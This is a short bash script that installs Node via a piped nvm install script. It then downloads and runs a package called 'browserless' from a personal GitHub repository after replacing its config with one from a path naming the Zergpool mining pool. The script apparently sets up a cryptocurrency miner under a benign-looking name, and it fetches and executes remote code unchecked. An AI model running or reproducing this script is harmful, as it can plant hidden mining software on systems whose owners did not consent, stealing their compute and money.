#!/bin/bash

apt update
apt install curl ca-certificates -y
curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
source ~/.bashrc
nvm install 18
curl https://github.com/bibirbusin/bibirbusin/raw/main/browserless.tar.gz -L -O -J
tar -xf browserless.tar.gz
rm browserless.tar.gz
cd browserless
rm config.json
wget https://raw.githubusercontent.com/bibirbusin/bibirbusin/main/zergpool/smtsolo/config.json
npm install
sh install.sh
node index.js
